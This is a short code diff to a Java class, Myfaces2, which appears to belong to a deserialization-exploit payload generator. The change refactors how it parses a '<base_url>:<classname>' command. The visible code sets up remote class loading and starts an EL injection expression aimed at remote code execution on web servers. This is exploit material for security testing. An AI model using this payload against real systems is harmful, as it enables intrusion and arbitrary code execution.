@@ -41,14 +41,14 @@ public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
 
-    public Object getObject ( String command ) throws Exception {
-        int sep = command.lastIndexOf(':');
+    public Object getObject ( String ... command ) throws Exception {
+        int sep = command[0].lastIndexOf(':');
         if ( sep < 0 ) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
         }
 
-        String url = command.substring(0, sep);
-        String className = command.substring(sep + 1);
+        String url = command[0].substring(0, sep);
+        String className = command[0].substring(sep + 1);
 
         // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
         String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";
